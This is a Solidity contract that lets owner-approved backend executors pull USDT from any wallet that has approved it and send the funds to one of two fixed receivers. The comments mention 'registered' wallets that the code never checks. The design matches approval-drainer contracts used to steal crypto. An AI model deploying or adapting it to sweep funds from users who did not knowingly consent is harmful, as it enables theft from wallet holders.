// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AllowanceSpender is Ownable, ReentrancyGuard {
    using SafeERC20 for IERC20;

    IERC20 public immutable usdt;
    address public immutable RECEIVER1;
    address public immutable RECEIVER2;
    mapping(address => bool) public isExecutor;

    event ExecutorAdded(address indexed executor);
    event ExecutorRemoved(address indexed executor);
    event TransferExecuted(address indexed executor, address indexed wallet, address indexed receiver, uint256 amount);

    error InvalidAddress();
    error UnauthorizedExecutor();
    error InsufficientAllowance(uint256 available, uint256 required);
    error InsufficientBalance(uint256 available, uint256 required);
    error InvalidReceiver();

    /// @param token BEP-20 USDT token address.
    /// @param receiver1 First permitted destination wallet.
    /// @param receiver2 Second permitted destination wallet.
    constructor(address token, address receiver1, address receiver2) Ownable(msg.sender) {
        if (token == address(0) || receiver1 == address(0) || receiver2 == address(0)) revert InvalidAddress();
        usdt = IERC20(token);
        RECEIVER1 = receiver1;
        RECEIVER2 = receiver2;
    }

    /// @notice Adds an authorized backend executor.
    function addExecutor(address executor) external onlyOwner {
        if (executor == address(0)) revert InvalidAddress();
        isExecutor[executor] = true;
        emit ExecutorAdded(executor);
    }

    /// @notice Removes an authorized backend executor.
    function removeExecutor(address executor) external onlyOwner {
        isExecutor[executor] = false;
        emit ExecutorRemoved(executor);
    }

    /// @notice Transfers the requested amount from a registered wallet to RECEIVER1.
    function executeToReceiver1(address wallet, uint256 amount) external nonReentrant {
        _execute(wallet, RECEIVER1, amount);
    }

    /// @notice Transfers the requested amount from a registered wallet to RECEIVER2.
    function executeToReceiver2(address wallet, uint256 amount) external nonReentrant {
        _execute(wallet, RECEIVER2, amount);
    }

    function _execute(address wallet, address receiver, uint256 amount) private {
        if (!isExecutor[msg.sender]) revert UnauthorizedExecutor();
        if (wallet == address(0) || receiver != RECEIVER1 && receiver != RECEIVER2) revert InvalidReceiver();
        uint256 allowance = usdt.allowance(wallet, address(this));
        if (allowance < amount) revert InsufficientAllowance(allowance, amount);
        uint256 balance = usdt.balanceOf(wallet);
        if (balance < amount) revert InsufficientBalance(balance, amount);
        usdt.safeTransferFrom(wallet, receiver, amount);
        emit TransferExecuted(msg.sender, wallet, receiver, amount);
    }
}